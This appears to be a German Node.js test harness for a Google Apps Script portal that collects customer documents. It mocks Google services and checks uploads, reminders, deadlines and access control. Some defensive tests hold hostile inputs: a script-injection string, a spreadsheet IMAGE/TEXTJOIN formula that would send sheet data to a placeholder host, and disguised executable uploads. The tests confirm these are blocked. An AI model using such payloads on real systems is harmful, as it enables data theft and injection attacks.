#!/usr/bin/env node
/**
 * Lokaler Testlauf der Server-Logik ohne Google-Konto.
 *   node tools/test-lokal.js
 *
 * Bildet Tabelle, Drive, Gmail, Trigger und Sperren im Speicher nach und spielt einen
 * kompletten Fall durch: Ersteinrichtung, Musterfall, Link, Kundenseite, Uploads,
 * "nicht vorhanden", Einladung, Erinnerungen 1 und 2, Fristmeldung, Sperren.
 * Nichts verlässt den Rechner.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');

const as = (n) => path.join(__dirname, '..', 'apps-script', n);
let fehler = 0;
function pruefe(bed, text) {
  console.log((bed ? '  ok    ' : '  FEHLER ') + text);
  if (!bed) fehler++;
}

/* ------------------------------------------------------------------ Nachbau Google-Dienste */

function formatDate(d, tz, muster) {
  const teile = {};
  new Intl.DateTimeFormat('de-DE', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false })
    .formatToParts(d).forEach((p) => { teile[p.type] = p.value; });
  const ersatz = { yyyy: teile.year, MM: teile.month, dd: teile.day, HH: teile.hour === '24' ? '00' : teile.hour, mm: teile.minute, ss: teile.second };
  return muster.split(/('[^']*')/).map((s) => s.startsWith("'") ? s.slice(1, -1)
    : s.replace(/yyyy|MM|dd|HH|mm|ss/g, (k) => ersatz[k])).join('');
}

class Range {
  constructor(sheet, r, c, nr, nc) { Object.assign(this, { sheet, r, c, nr, nc }); }
  getValues() {
    const out = [];
    for (let i = 0; i < this.nr; i++) {
      const z = this.sheet.data[this.r - 1 + i] || [];
      const zeile = [];
      for (let j = 0; j < this.nc; j++) { const v = z[this.c - 1 + j]; zeile.push(v === undefined ? '' : v); }
      out.push(zeile);
    }
    return out;
  }
  setValues(w) {
    for (let i = 0; i < w.length; i++) {
      const idx = this.r - 1 + i;
      while (this.sheet.data.length <= idx) this.sheet.data.push([]);
      for (let j = 0; j < w[i].length; j++) this.sheet.data[idx][this.c - 1 + j] = w[i][j];
    }
    return this;
  }
  setValue(v) { return this.setValues([[v]]); }
  setNumberFormat() { return this; }
  getRow() { return this.r; }
  setFontWeight() { return this; } setBackground() { return this; } setWrap() { return this; }
  setDataValidation() { return this; }
}

class Sheet {
  constructor(name) { this.name = name; this.data = []; }
  getName() { return this.name; }
  getLastRow() { return this.data.filter((z) => z.some((v) => v !== '' && v !== undefined)).length; }
  getLastColumn() { return this.data.reduce((m, z) => Math.max(m, z.length), 0); }
  getMaxRows() { return 1000; }
  getRange(r, c, nr, nc) { return new Range(this, r, c, nr || 1, nc || 1); }
  getDataRange() { return new Range(this, 1, 1, this.getLastRow(), this.getLastColumn()); }
  appendRow(z) { this.data.push(z.slice()); }
  setFrozenRows() {} setColumnWidth() {}
  getActiveRange() { return new Range(this, AKTIVE_ZEILE, 1, 1, 1); }
}
let AKTIVE_ZEILE = 2;
let AKTIVER_NUTZER = 'test@example.com';      // '' = anonymer Besucher der Kundenseite

const ss = {
  sheets: [new Sheet('Tabellenblatt1')], tz: 'America/Los_Angeles',
  getSpreadsheetTimeZone() { return this.tz; }, setSpreadsheetTimeZone(z) { this.tz = z; },
  getId: () => 'TABELLE', getUrl: () => 'https://docs.google.com/spreadsheets/d/TABELLE/edit',
  getSheetByName(n) { return this.sheets.find((s) => s.name === n) || null; },
  insertSheet(n) { const s = new Sheet(n); this.sheets.push(s); return s; },
  getSheets() { return this.sheets; },
  deleteSheet(s) { this.sheets = this.sheets.filter((x) => x !== s); }
};

function iter(arr) { let i = 0; return { hasNext: () => i < arr.length, next: () => arr[i++] }; }
const ordner = {};
function neuerOrdner(name) {
  const id = 'O' + Object.keys(ordner).length;
  const o = { id, name, files: [], folders: [],
    getId: () => id, getName: () => name, getUrl: () => 'https://drive.google.com/drive/folders/' + id,
    createFolder: (n) => { const k = neuerOrdner(n); o.folders.push(k); return k; },
    createFile: (blob) => { const f = { name: blob.name, getUrl: () => 'https://drive.google.com/file/d/F' + o.files.length }; o.files.push(f); return f; },
    getFilesByName: (n) => iter(o.files.filter((f) => f.name === n)) };
  ordner[id] = o;
  return o;
}

const props = {};
const mails = [];
const trigger = [];
const hinweise = [];

const ctx = {
  console,
  SpreadsheetApp: {
    getActiveSpreadsheet: () => ss, openById: () => ss,
    getActiveSheet: () => ss.getSheetByName('Faelle'),
    getUi: () => ({ alert: (t) => hinweise.push(t) }),
    newDataValidation: () => { const b = { requireValueInList: () => b, setAllowInvalid: () => b, build: () => ({}) }; return b; }
  },
  PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] || null, setProperty: (k, v) => { props[k] = v; } }) },
  DriveApp: { getFolderById: (id) => { if (!ordner[id]) throw new Error('kein Ordner'); return ordner[id]; }, createFolder: neuerOrdner },
  Utilities: {
    formatDate, getUuid: () => crypto.randomUUID(),
    base64Decode: (s) => Array.from(Buffer.from(s, 'base64')).map((b) => (b > 127 ? b - 256 : b)),
    newBlob: (bytes, mime, name) => ({ bytes, mime, name })
  },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  GmailApp: {
    createDraft: (an, betreff, text, opt) => mails.push({ art: 'entwurf', an, betreff, text, opt }),
    sendEmail: (an, betreff, text, opt) => mails.push({ art: 'gesendet', an, betreff, text, opt })
  },
  Session: { getEffectiveUser: () => ({ getEmail: () => 'test@example.com' }),
             getActiveUser: () => ({ getEmail: () => AKTIVER_NUTZER }) },
  ScriptApp: {
    getProjectTriggers: () => trigger,
    newTrigger: (fn) => { const b = { timeBased: () => b, everyDays: () => b, atHour: () => b, inTimezone: () => b,
      create: () => trigger.push({ getHandlerFunction: () => fn, getUniqueId: () => 'T1' }) }; return b; }
  },
  HtmlService: {
    createHtmlOutputFromFile: (n) => ({ getContent: () => fs.readFileSync(as(n + '.html'), 'utf8') }),
    createTemplateFromFile: (n) => {
      const tpl = { evaluate: () => {
        const src = fs.readFileSync(as(n + '.html'), 'utf8');
        const html = rendern(src, Object.assign({ include: ctx.include }, tpl));
        const out = { html, getContent: () => html, setTitle: () => out, addMetaTag: () => out, setXFrameOptionsMode: (m) => { out.xframe = m; return out; },
          setWidth: () => out, setHeight: () => out };
        return out;
      } };
      return tpl;
    },
    XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' }
  },
  MimeType: { PLAIN_TEXT: 'text/plain' },
  Logger: { log: () => {} }
};

function rendern(src, daten) {
  const esc = (x) => String(x).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  let code = 'let __o = "";\n';
  const re = /<\?(!?=)?([\s\S]*?)\?>/g;
  let last = 0, m;
  while ((m = re.exec(src))) {
    code += '__o += ' + JSON.stringify(src.slice(last, m.index)) + ';\n';
    if (m[1] === '=') code += '__o += __esc(' + m[2] + ');\n';
    else if (m[1] === '!=') code += '__o += (' + m[2] + ');\n';
    else code += m[2] + '\n';
    last = re.lastIndex;
  }
  code += '__o += ' + JSON.stringify(src.slice(last)) + ';\nreturn __o;';
  return new Function('__d', '__esc', 'with (__d) {' + code + '}')(daten, esc);
}

vm.createContext(ctx);
['Code.gs', 'Texte.gs', 'Verwaltung.gs'].forEach((n) => vm.runInContext(fs.readFileSync(as(n), 'utf8'), ctx, { filename: n }));
const run = (code) => vm.runInContext(code, ctx);

// Checklisten wie aus der Einrichtung: Bibliothek Finanzierung über tools/checkliste-lib.js
const { lesen: checklisteLesen } = require('./checkliste-lib');
const bib = (n) => fs.readFileSync(path.join(__dirname, '..', 'vorlagen', 'checklisten', n), 'utf8');
ctx.CHECKLISTEN = checklisteLesen(bib('finanzierung.csv'), 'finanzierung.csv').zeilen;

/* ------------------------------------------------------------------ Hilfen */

const zeilen = (blatt) => { ctx.EINST_CACHE_ = null; return run('lesen_("' + blatt + '")'); };
function setzeFall(fallId, felder) {
  const f = zeilen('Faelle').find((x) => x.fall_id === fallId);
  Object.assign(f, felder);
  ctx.__f = f; run('schreiben_("Faelle", __f)');
}
const vorTagen = (n) => { const d = new Date(); d.setDate(d.getDate() - n); return d; };
const pdf = Buffer.from('%PDF-1.4\n%Test\n').toString('base64');

/* ------------------------------------------------------------------ Ablauf */

console.log('1 Ersteinrichtung');
run('ersteinrichtung()');
pruefe(['Einstellungen', 'Faelle', 'Checklisten', 'Positionen', 'Eingaenge', 'Mailtexte'].every((n) => ss.getSheetByName(n)), 'alle sechs Blätter da');
pruefe(!ss.getSheetByName('Tabellenblatt1'), 'leeres Standardblatt entfernt');
pruefe(trigger.length === 1, 'täglicher Trigger angelegt');
pruefe(ss.tz === 'Europe/Berlin', 'Zeitzone der Tabelle auf Europe/Berlin gestellt');
let faelle = zeilen('Faelle');
pruefe(faelle.length === 1 && faelle[0].nachname === 'Mustermann', 'Musterfall angelegt');
const muster = faelle[0];
pruefe(/^[a-f0-9]{40}$/.test(muster.token), 'Token 40 Zeichen hex');
pruefe(muster.link === '' && /Links neu aufbauen/.test(muster.notiz), 'ohne Web-App noch kein Link, Hinweis in notiz');
const pos = zeilen('Positionen').filter((p) => p.fall_id === muster.fall_id);
pruefe(pos.length === 17, 'Musterfall hat 17 Positionen (' + pos.length + ')');
pruefe(pos.filter((p) => p.status === 'geprueft').length === 2, 'zwei Positionen vorab geprüft');
pruefe(muster.offen === 12, 'offene Positionen 12: 3 persönliche + Bestandsfrage + 8 Objekt (' + muster.offen + ')');
run('ersteinrichtung()');
pruefe(zeilen('Faelle').length === 1 && zeilen('Checklisten').length === 27, 'zweiter Lauf legt nichts doppelt an');

console.log('2 Bereitstellung und Links');
run("var KONFIG = { WEBAPP_URL: 'https://script.google.com/macros/s/TEST/exec', LINK_BASIS: '' };");
run('menueLinksNeu()');
const link = zeilen('Faelle')[0].link;
pruefe(link === 'https://script.google.com/macros/s/TEST/exec?t=' + muster.token, 'Link aus WEBAPP_URL');

console.log('3 Kundenseite');
let seite = run('doGet({ parameter: { t: "' + muster.token + '" } })');
pruefe(seite.html.includes('Musterstraße 13') && seite.html.includes('Kontoauszüge'), 'Seite enthält Vorgang und Checkliste');
pruefe(!seite.xframe, 'ohne Domain keine Einbettung erlaubt');
pruefe(!/\{\{|\{THEMA\}|\{FIRMA\}/.test(seite.html), 'keine offenen Platzhalter');
seite = run('doGet({ parameter: { t: "falsch" } })');
pruefe(seite.html.includes('var GUELTIG = String(false)'), 'falsches Token zeigt ungültige Ansicht');

console.log('4 Uploads');
const konto = pos.find((p) => p.titel.startsWith('Kontoauszüge'));
ctx.__p = { name: 'Juli.pdf', mimeType: 'application/pdf', bytes: pdf, unterlage: konto.titel, key: konto.key };
const r1 = run('uploadFile("' + muster.token + '", __p)');
pruefe(/Kontoauszüge .* - Juli\.pdf/.test(r1.name), 'Datei abgelegt als "' + r1.name + '"');
let p1 = zeilen('Positionen').find((p) => p.key === konto.key && p.fall_id === muster.fall_id);
pruefe(p1.dateien === 1 && p1.status === 'eingegangen', 'Position zählt 1 Datei, Status eingegangen');
pruefe(zeilen('Eingaenge').length === 1, 'Eingang protokolliert');
run('uploadFile("' + muster.token + '", __p)');
pruefe(ordner[Object.keys(ordner)[1]].files.length === 2, 'gleicher Name überschreibt nicht');
seite = run('doGet({ parameter: { t: "' + muster.token + '" } })');
pruefe(/"dateien":2/.test(seite.html), 'Seite kennt nach Neuladen die 2 Dateien');
const kind = pos.find((p) => p.eltern_key && p.titel === 'Grundbuchauszug');
ctx.__p = { name: 'gb.pdf', mimeType: 'application/pdf', bytes: pdf, unterlage: 'Immobilien im Bestand Teststr. 1 - Grundbuchauszug',
            key: kind.eltern_key + '--o1--' + kind.key };
run('uploadFile("' + muster.token + '", __p)');
pruefe(zeilen('Positionen').find((p) => p.key === kind.key && p.fall_id === muster.fall_id).dateien === 1, 'Objektblock zählt beim Kind');
function wirft(code, muster2, text) {
  try { run(code); pruefe(false, text); } catch (e) { pruefe(muster2.test(e.message), text + ' (' + e.message + ')'); }
}
ctx.__p = { name: 'x.exe', bytes: pdf, key: konto.key };
wirft('uploadFile("' + muster.token + '", __p)', /Sicherheitsgründen/, '.exe abgelehnt');
ctx.__p = { name: 'getarnt.pdf', bytes: Buffer.from('PK\x03\x04zip').toString('base64'), key: konto.key };
wirft('uploadFile("' + muster.token + '", __p)', /Sicherheitsgründen/, 'umbenanntes ZIP abgelehnt');

console.log('5 Nicht vorhanden');
const darl = pos.find((p) => p.titel.startsWith('Darlehensverträge'));
run('meldeNichtVorhanden("' + muster.token + '", "' + darl.key + '", "Darlehensverträge", "Habe keine Kredite")');
pruefe(zeilen('Positionen').find((p) => p.key === darl.key && p.fall_id === muster.fall_id).status === 'nicht_vorhanden', 'Status nicht_vorhanden');
seite = run('doGet({ parameter: { t: "' + muster.token + '" } })');
pruefe(seite.html.includes('Habe keine Kredite'), 'Grund erscheint nach Neuladen');
run('nimmMeldungZurueck("' + muster.token + '", "' + darl.key + '")');
pruefe(zeilen('Positionen').find((p) => p.key === darl.key && p.fall_id === muster.fall_id).status === 'offen', 'Rücknahme setzt offen');
ctx.__p = 'x</script><script>alert(1)</script>';
run('meldeNichtVorhanden("' + muster.token + '", "' + darl.key + '", "D", __p)');
seite = run('doGet({ parameter: { t: "' + muster.token + '" } })');
pruefe(!seite.html.includes('</script><script>alert(1)'), 'Kundentext kann den Script-Block nicht brechen');

console.log('6 Neuer Fall mit Einladung');
ctx.__d = { vorname: 'Erika', nachname: 'Beispiel', anrede: 'Frau', ansprache: 'du', email: 'erika@example.com',
            vorgang: 'Testweg 5', checkliste: 'Finanzierung Selbstständige', einladen: true };
const neu = run('fallAnlegen(__d)');
pruefe(neu.mail === 'Entwurf angelegt' && mails.length === 1, 'Einladung als Entwurf');
pruefe(mails[0].an === 'erika@example.com' && mails[0].text.startsWith('Hallo Erika,') && mails[0].text.includes(neu.link),
  'Du-Anrede und Link in der Einladung');
pruefe(!/\{\{/.test(mails[0].betreff + mails[0].text), 'Einladung ohne offene Platzhalter: "' + mails[0].betreff + '"');
pruefe(!!zeilen('Faelle').find((f) => f.fall_id === neu.fall_id).eingeladen_am, 'eingeladen_am gesetzt');
pruefe(/Beste Grüße\n\nMax Beispiel\nMusterfirma GmbH · 01234/.test(mails[0].text), 'Signatur aus den Firmendaten, wenn keine eingetragen ist');

console.log('7 Erinnerungen und Frist');
const gueltig = (fid) => run('iso_(lesen_("Faelle").filter(function(f){return f.fall_id==="' + fid + '"})[0].gueltig_bis)');
const wt = new Date(gueltig(neu.fall_id) + 'T12:00:00').getDay();
pruefe(wt !== 0 && wt !== 6, 'Linkende fällt auf einen Werktag (' + gueltig(neu.fall_id) + ')');
setzeFall(neu.fall_id, { eingeladen_am: vorTagen(8) });
mails.length = 0;
run('taeglicherLauf({ triggerUid: "T1" })');
const e1m = mails.find((m) => m.an === 'erika@example.com');
pruefe(!!e1m && /^Deine Unterlagen/.test(e1m.betreff) && /vor 8 Tagen/.test(e1m.text), 'Erinnerung 1 an Tag 8 mit "vor 8 Tagen"');
pruefe(mails.some((m) => m.an === 'test@example.com' && /Tagesmeldung/.test(m.betreff)), 'Tagesmeldung an den Betreiber');
mails.length = 0;
run('taeglicherLauf({ triggerUid: "T1" })');
pruefe(!mails.some((m) => m.an === 'erika@example.com'), 'keine doppelte Erinnerung am nächsten Lauf');
setzeFall(neu.fall_id, { eingeladen_am: vorTagen(15), erinnerung_1_am: vorTagen(8) });
run('taeglicherLauf({ triggerUid: "T1" })');
const e2 = mails.find((m) => /^Letzte Erinnerung/.test(m.betreff));
pruefe(!!e2 && /siehst du in deiner Liste/.test(e2.text), 'Erinnerung 2 mit Satz statt Liste bei mehr als 5 offenen');
const dat = gueltig(neu.fall_id).split('-').reverse().join('.');
pruefe(!!e2 && e2.text.includes('bis ' + dat + ' nicht vollständig'), 'Erinnerung 2 nennt genau das Linkende ' + dat);
setzeFall(neu.fall_id, { gueltig_bis: vorTagen(1) });
mails.length = 0;
run('taeglicherLauf({ triggerUid: "T1" })');
pruefe(zeilen('Faelle').find((f) => f.fall_id === neu.fall_id).status === 'abgelaufen', 'nach Linkende Status abgelaufen');
pruefe(mails.some((m) => /Frist abgelaufen/.test(m.text)), 'Frist an den Betreiber gemeldet');
pruefe(!mails.some((m) => m.an === 'erika@example.com'), 'nach Frist keine Kundenmail');
AKTIVE_ZEILE = zeilen('Faelle').find((f) => f.fall_id === neu.fall_id)._zeile;
run('menueVerlaengern()');
const nachV = zeilen('Faelle').find((f) => f.fall_id === neu.fall_id);
pruefe(nachV.status === 'aktiv' && run('iso_(lesen_("Faelle")[' + (nachV._zeile - 2) + '].gueltig_bis)') > run('heute_()'), 'Verlängern öffnet den Link wieder');
mails.length = 0;
run('taeglicherLauf({ triggerUid: "T1" })');
pruefe(!mails.some((m) => /Frist abgelaufen/.test(m.text)), 'nach Verlängern keine sofortige Fristmeldung');

setzeFall(muster.fall_id, { letzter_eingang: new Date(), eingeladen_am: vorTagen(8), erinnerung_1_am: '' });
mails.length = 0;
run('taeglicherLauf({ triggerUid: "T1" })');
pruefe(!mails.some((m) => m.an === 'test@example.com' && /^Ihre Unterlagen/.test(m.betreff)), 'Pause: keine Erinnerung nach frischem Upload');

console.log('8 Zugriffsschutz, Formeln, Status, Sonderfälle');
AKTIVER_NUTZER = '';
['fallAnlegen(__d)', 'taeglicherLauf()', 'taeglicherLauf({ triggerUid: "gefaelscht" })', 'ersteinrichtung()', 'selbsttest()',
 'menueLinksNeu()', 'menueSperren()', 'menueVerlaengern()', 'menueEinladung()', 'menueNeuerFall()', 'menueLaufJetzt()'].forEach((c) => {
  wirft(c, /Keine Berechtigung/, 'anonym abgewiesen: ' + c);
});
AKTIVER_NUTZER = 'fremd@example.org';
wirft('fallAnlegen(__d)', /Keine Berechtigung/, 'fremdes Konto abgewiesen');
AKTIVER_NUTZER = 'test@example.com';

ctx.__p = '=IMAGE("https://x/?"&TEXTJOIN(",",1,Faelle!V:V))';
run('meldeNichtVorhanden("' + muster.token + '", "' + darl.key + '", "D", __p)');
const eRoh = ss.getSheetByName('Eingaenge').data;
pruefe(eRoh[eRoh.length - 1].some((v) => v === "'" + ctx.__p), 'Formel im Kundentext als Text gespeichert (Apostroph)');
const pRoh = ss.getSheetByName('Positionen').data.find((z) => z.includes(darl.key) && z.includes(muster.fall_id));
pruefe(pRoh.some((v) => v === "'" + ctx.__p), 'auch in der Positionen-Spalte grund');

// Status zurück von vollständig auf aktiv
const fid3 = run('fallAnlegen({ vorname: "A", nachname: "B", email: "a@example.com", checkliste: "Finanzierung Selbstständige", einladen: false })').fall_id;
zeilen('Positionen').filter((x) => x.fall_id === fid3).forEach((x) => { x.status = 'geprueft'; ctx.__x = x; run('schreiben_("Positionen", __x)'); });
run('taeglicherLauf({ triggerUid: "T1" })');
pruefe(zeilen('Faelle').find((f) => f.fall_id === fid3).status === 'vollstaendig', 'alles geprüft: vollständig');
const eine = zeilen('Positionen').find((x) => x.fall_id === fid3); eine.status = 'offen'; ctx.__x = eine; run('schreiben_("Positionen", __x)');
run('taeglicherLauf({ triggerUid: "T1" })');
pruefe(zeilen('Faelle').find((f) => f.fall_id === fid3).status === 'aktiv', 'wieder offen: zurück auf aktiv');

// Höchstens 5 offen: Liste in Erinnerung 2
zeilen('Positionen').filter((x) => x.fall_id === fid3).slice(1, 4).forEach((x) => { x.status = 'offen'; ctx.__x = x; run('schreiben_("Positionen", __x)'); });
setzeFall(fid3, { status: 'aktiv', eingeladen_am: vorTagen(15), erinnerung_1_am: vorTagen(8), link: 'https://x/?t=1' });
mails.length = 0;
run('taeglicherLauf({ triggerUid: "T1" })');
const e2b = mails.find((m) => /^Letzte Erinnerung/.test(m.betreff));
pruefe(!!e2b && (e2b.text.match(/^- /gm) || []).length >= 1 && (e2b.text.match(/^- /gm) || []).length <= 5, 'bis 5 offene: Liste in der Mail');

// Bestandsfrage: "Nein" erledigt, Unterposition mit Datei erledigt
const vorher = zeilen('Faelle').find((f) => f.fall_id === muster.fall_id);
setzeFall(muster.fall_id, { status: 'aktiv' });
const eltern = pos.find((x) => x.frage);
run('meldeNichtVorhanden("' + muster.token + '", "' + eltern.key + '", "Bestand", "Keine vorhanden")');
const nachNein = zeilen('Faelle').find((f) => f.fall_id === muster.fall_id).offen;
run('nimmMeldungZurueck("' + muster.token + '", "' + eltern.key + '")');
pruefe(zeilen('Faelle').find((f) => f.fall_id === muster.fall_id).offen === nachNein + 1, 'Bestandsfrage zählt als offen, bis Nein gemeldet ist');
seite = run('doGet({ parameter: { t: "' + muster.token + '" } })');
pruefe(/"vorDateien":1/.test(seite.html), 'Seite kennt frühere Dateien im Objektblock');

// Mailmodus aus
run('lesen_("Einstellungen").filter(function(z){return z.schluessel==="mailmodus"}).forEach(function(z){ z.wert="aus"; schreiben_("Einstellungen", z); })');
ctx.EINST_CACHE_ = null;
mails.length = 0;
const aus = run('fallAnlegen({ vorname: "C", nachname: "D", email: "c@example.com", checkliste: "Finanzierung Selbstständige", einladen: true })');
pruefe(/Mailmodus "aus"/.test(aus.mail) && mails.length === 0, 'Modus aus: keine Mail, Hinweis mit Link');
pruefe(!!zeilen('Faelle').find((f) => f.fall_id === aus.fall_id).eingeladen_am, 'Modus aus: Einladungsdatum trotzdem gesetzt');

// Fall-ID ab 1000
const jahr = String(new Date().getFullYear());
ss.getSheetByName('Faelle').appendRow([jahr + '-999']);
pruefe(run('neueFallId_()') === jahr + '-1000', 'Fall-ID nach 999 ist 1000');
ss.getSheetByName('Faelle').data.pop();

// unlesbares Linkende sperrt
setzeFall(muster.fall_id, { gueltig_bis: '30/11/2099' });
pruefe(run('findFall_("' + muster.token + '")') === null, 'unlesbares Datum sperrt den Link');

// HEIC: echtes HEIC ja, Video mit .heic nein
const heic = Buffer.concat([Buffer.from([0, 0, 0, 24]), Buffer.from('ftypheic')]).toString('base64');
const mp4 = Buffer.concat([Buffer.from([0, 0, 0, 24]), Buffer.from('ftypisom')]).toString('base64');
pruefe(run('magicPasst_("heic", Utilities.base64Decode("' + heic + '"))') === true, 'HEIC erkannt');
pruefe(run('magicPasst_("heic", Utilities.base64Decode("' + mp4 + '"))') === false, 'Video mit Endung .heic abgelehnt');

console.log('8b Sperren und Domain');
setzeFall(muster.fall_id, { gueltig_bis: vorTagen(-10) });
AKTIVE_ZEILE = zeilen('Faelle').find((f) => f.fall_id === muster.fall_id)._zeile;
run('menueSperren()');
ctx.__p = { name: 'a.pdf', bytes: pdf, key: konto.key };
wirft('uploadFile("' + muster.token + '", __p)', /nicht mehr gültig/, 'gesperrter Link nimmt nichts mehr an');
run("KONFIG.LINK_BASIS = 'https://www.example.com/unterlagen/';");
run('menueLinksNeu()');
const erika = zeilen('Faelle').find((f) => f.fall_id === neu.fall_id);
pruefe(erika.link.startsWith('https://www.example.com/unterlagen/?t='), 'Links zeigen auf eigene Domain');
seite = run('doGet({ parameter: { t: "' + erika.token + '" } })');
pruefe(seite.xframe === 'ALLOWALL', 'mit Domain ist die Einbettung erlaubt');

console.log('9 Checklisten-Bibliothek und Branchenneutralität');
['finanzierung.csv', 'energieberatung.csv', 'allgemein.csv'].forEach((n) => {
  const e = checklisteLesen(bib(n), n);
  pruefe(e.fehler.length === 0 && e.zeilen.length > 0, 'Bibliothek ' + n + ' fehlerfrei (' + e.zeilen.length + ' Zeilen)' + (e.fehler.length ? ': ' + e.fehler.join(' | ') : ''));
});
const kaputt = checklisteLesen('vorlage;gruppe;gruppe_untertitel;titel;hinweis;erwartet;gehoert_zu;frage\nA;G;;Kind;;1;Gibtsnicht;\nA;G;;X;;abc;;\n', 'test');
pruefe(kaputt.fehler.length === 2, 'Prüfung erkennt fehlende Elternposition und falsche Anzahl');
const mitQuote = checklisteLesen('vorlage;gruppe;gruppe_untertitel;titel;hinweis;erwartet;gehoert_zu;frage\nA;G;;"Titel; mit Semikolon";"Hinweis ""zitiert""";2;;\n', 'test');
pruefe(mitQuote.zeilen[0][3] === 'Titel; mit Semikolon' && mitQuote.zeilen[0][4] === 'Hinweis "zitiert"', 'CSV mit Anführungszeichen und Semikolon');
seite = run('doGet({ parameter: { t: "' + zeilen('Faelle').find((f) => f.fall_id === neu.fall_id).token + '" } })');
pruefe(seite.html.includes('für die <em>Beratung</em>'), 'Hero-Titel mit Artikel und Thema aus den Einstellungen');
const energie = checklisteLesen(bib('energieberatung.csv'), 'e').zeilen;
ctx.__z = energie;
run('(function(){ var b = blatt_("Checklisten"); b.getRange(b.getLastRow() + 1, 1, __z.length, 10).setValues(__z); })()');
const fe = run('fallAnlegen({ vorname: "E", nachname: "Nergie", email: "e@example.com", checkliste: "Sanierungsfahrplan (iSFP)", einladen: false })');
const posE = zeilen('Positionen').filter((x) => x.fall_id === fe.fall_id);
pruefe(posE.length === 17 && posE.some((x) => x.block_name === 'Maßnahme'), 'Energieberatungs-Fall (iSFP) mit 17 Positionen und Maßnahmen-Block angelegt');
const sE = run('doGet({ parameter: { t: "' + zeilen('Faelle').find((f) => f.fall_id === fe.fall_id).token + '" } })');
pruefe(/"blockName":"Maßnahme"/.test(sE.html) && /"blockFeld":"Art der Maßnahme und Jahr"/.test(sE.html), 'Block-Name und Feld kommen aus der Checkliste');
pruefe(sE.html.includes('Heizkosten- oder Brennstoffabrechnungen'), 'Kundenseite zeigt die Energieberatungs-Checkliste');

console.log('10 Selbsttest');
const st = run('selbsttest()');
pruefe(!/FEHLT/.test(st), 'Selbsttest ohne Fehlstellen');

console.log(fehler ? '\n' + fehler + ' FEHLER' : '\nAlle Prüfungen bestanden.');
process.exit(fehler ? 1 : 0);
